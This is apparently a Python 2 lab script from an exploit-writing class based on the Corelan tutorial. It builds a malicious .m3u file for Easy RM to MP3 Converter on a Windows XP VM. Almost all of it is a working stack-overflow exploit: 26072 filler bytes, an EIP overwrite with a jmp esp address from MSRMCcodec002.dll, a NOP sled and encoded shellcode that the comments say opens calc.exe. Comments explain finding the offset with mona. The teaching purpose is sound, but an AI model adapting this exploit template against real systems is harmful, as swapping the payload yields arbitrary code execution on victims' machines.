#!C:\python27\python.exe

from struct import *

'''
This is a starting file for the Corelan Exploit tutorial which can be found here:
https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

Steps to get started:
1) Create a Windows XP VM (obtain VMware license as necessary) 
	a) key in windows_xp.txt
	b) do install vmware tools
2) Install software
	a) python-2.7.4 -- make sure to add this to the path for simplicity
	b) notepad++ 6.6 (if you want it -- I use it for the tutorial)
	c) immunity debugger 1.85
	4) mona (see readme for instructions)
	e) EasyRMtoMP3Converter -- you'll want to unzip this hostside, then copy it over
C) Copy the exploit_start.py script (this file) to your VM
4) TAKE A SNAPSHOT OF YOUR VM. Trust me on this, life will be better if you do.
	a) it is faster to do this if your VM is powered down, but it will work either way.
	2) if you do snapshot with it on, do be kind, and leave it alone while it's doing its work.

Steps 1,2,C taken care of.

Some notes:
[]The tutorial uses windbg + metasploit + perl
[]We will use immunity + mona + python
[]We are running this on an old XP VM.
[]The versions of python and notepad++ are the latest that run on such an old platform
[]If you don't know how to edit the system path, just ask when we get started. Likely you're not alone.
'''


def main():
	#we need a file, I just call it crash.m3u
	out = open('crash.m3u','w')

	# As per the tutorial , I determined that EIP had an offset between 25000 and 30000. To find the exact
	# location, I concatenated a unique pattern to the string ('4Bk5' * 5000). I then ran the command: 
	# '!mona findmsp 356B4234 5000' 
	# to find the buffer length needed to overwrite EIP. It returned:
	# 'EIP contains normal pattern: 0x356b4234 (offset 1094)' 
	# so I knew the buffer length was 1094. In order for EIP to contain 'BBBB' I had to modify the number 
	# of 'A's' in my string. I did this by initially starting with 26094 as per the tutorial and looking at the stack
	# contents in the lower right pane to see where 'BBBB' was and reducing the offset value accordingly, 
	# giving me a final value of 26072.
	write_string = 'A' * 26072
	
	# After completing the next step in the tutorial, I determined that ESP points to my code at address
	# 000FFD40
	
	# 'To find loaded dlls containing the opcode I ran the command:
	# '!mona find -s '\xff\xe4' 
	# and the first result was at the address 0x01AC023F in MSRMCcodec002.dll. I went to that address
	# (by typing the address into 'Go to address in Disassembler') to verify that the 'jmp esp' command
	# was there, which it was.
	write_string1 = pack('<L', 0x01AC023F)
	write_string2 = '\x90' * 25
	
	# calc.exe is the exploit payload and a calculator pops up once the shellcode is executed
	write_string3 = ('\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1'
							'\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30'
							'\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa'
							'\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96'
							'\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b'
							'\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a'
							'\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83'
							'\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98'
							'\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61'
							'\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05'
							'\x7f\xe8\x7b\xca'
							)		
	
	#write out and close the file
	out.write(write_string)
	out.write(write_string1)
	out.write(write_string2)
	out.write(write_string3)
	out.close()

	
if __name__ == '__main__':
	main()